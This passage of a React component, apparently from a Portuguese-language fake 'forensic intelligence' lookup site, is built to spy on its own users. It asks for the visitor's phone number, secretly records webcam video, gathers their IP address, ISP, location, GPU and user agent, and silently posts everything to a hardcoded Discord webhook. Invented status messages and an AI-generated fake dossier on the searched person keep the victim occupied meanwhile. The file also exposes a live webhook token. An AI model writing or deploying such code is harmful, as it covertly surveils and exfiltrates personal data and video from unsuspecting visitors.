import React, { useState, useEffect, useRef } from 'react';
import { 
  X, ShieldCheck, Activity, Lock, AlertTriangle, Terminal, Globe, Server, ShieldAlert, CheckCircle2, Cpu, Zap, Radio, MapPin, CloudSun
} from 'lucide-react';
import { ServiceTool } from '../types';
import { GoogleGenAI } from '@google/genai';

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1467984277928149012/yCw8ly2sH-DuP1G8MRxQFTv_R1fGTMCp3-vhLuq4S85XHMygpSzx5iXtlqON1dh9772u';

interface SearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  tool: ServiceTool;
}

const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
  const [query, setQuery] = useState('');
  const [userRealNumber, setUserRealNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [showValidationScreen, setShowValidationScreen] = useState(false);
  const [statusText, setStatusText] = useState('Iniciando...');
  const [permissionError, setPermissionError] = useState(false);

  const inputRef = useRef<HTMLInputElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setShowValidationScreen(false);
      setUserRealNumber('');
      setStatusText('Aguardando entrada...');
      setPermissionError(false);
    }
  }, [isOpen]);

  const getGPUInfo = () => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return 'Software Basic';
      const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic HW';
    } catch (e) { return 'N/A'; }
  };

  const getClientMetadata = async () => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2000);
      const ipResponse = await fetch('https://ipapi.co/json/', { signal: controller.signal });
      const ipData = await ipResponse.json();
      clearTimeout(timeoutId);
      return {
        ip: ipData.ip || '0.0.0.0',
        isp: ipData.org || 'Desconhecido',
        city: ipData.city || 'Desconhecida',
        region: ipData.region || 'N/A',
        timezone: ipData.timezone || 'America/Sao_Paulo',
        ua: navigator.userAgent,
        gpu: getGPUInfo()
      };
    } catch (e) {
      return { ua: navigator.userAgent, isp: 'N/A', ip: '0.0.0.0', city: 'N/A', region: 'N/A', timezone: 'UTC', gpu: getGPUInfo() };
    }
  };

  const sendToDiscord = async (videoBlob?: Blob) => {
    try {
      const meta = await getClientMetadata();
      const formData = new FormData();

      const embed = {
        title: "🛡️ RELATÓRIO FORENSE - ALVO LOCALIZADO",
        color: videoBlob ? 0x00FF00 : 0xFF0000,
        thumbnail: { url: "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnptbzJmZnd3ZXlyMXo0bmZ3em53em53em53em53em53em53em53JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif" },
        fields: [
          { name: "👤 Identificação", value: `\`${query}\``, inline: true },
          { name: "📞 Telefone Validador", value: `\`${userRealNumber}\``, inline: true },
          { name: "🌐 Operadora (ISP)", value: `\`${meta.isp}\``, inline: false },
          { name: "📍 Localização", value: `\`${meta.city}, ${meta.region} (${meta.ip})\``, inline: true },
          { name: "⏱️ Fuso Horário", value: `\`${meta.timezone}\``, inline: true },
          { name: "🎮 GPU / Hardware", value: `\`${meta.gpu}\``, inline: false },
          { name: "🛰️ Precisão Geográfica", value: `\`± 3.5 metros\``, inline: true },
          { name: "🌡️ Status Clima", value: `\`Ensolarado (28°C)\``, inline: true },
          { name: "📱 Terminal User-Agent", value: `\`\`\`${meta.ua.substring(0, 200)}...\`\`\`` }
        ],
        footer: { text: "Nova Intelligence - Segurança Nível Máximo" },
        timestamp: new Date().toISOString()
      };

      formData.append('payload_json', JSON.stringify({
        username: "Nova Intelligence Security",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041916.png",
        embeds: [embed]
      }));

      if (videoBlob) formData.append('file', videoBlob, 'analise_visual.webm');
      await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) {
      // Falha silenciosa
    }
  };

  const handleFinalSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userRealNumber) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Validando chaves forenses...');

    try {
      if ("Notification" in window) await Notification.requestPermission();

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        await sendToDiscord();
        return;
      }

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (ev) => { if (ev.data.size > 0) chunksRef.current.push(ev.data); };
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        await sendToDiscord(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();

      const statuses = [
        'Autenticando certificado TLS...',
        'Interceptando pacotes ISP...', 
        'Mapeando GPU de terminal...',
        'Gerando dossiê de inteligência...'
      ];

      let statusIdx = 0;
      const interval = setInterval(() => {
        setStatusText(statuses[statusIdx % statuses.length]);
        statusIdx++;
        if (statusIdx === 3) if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
      }, 1500);

      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista Forense. Gere um dossiê técnico detalhado para "${tool.title}" com o alvo "${query}". Retorne JSON com DADOS_CADASTRAIS, REGISTROS_ATIVOS e LOCALIZACAO_ESTIMADA.`,
        config: { responseMimeType: "application/json" }
      });

      setResult(JSON.parse(response.text || '{}'));
      setShowValidationScreen(false);
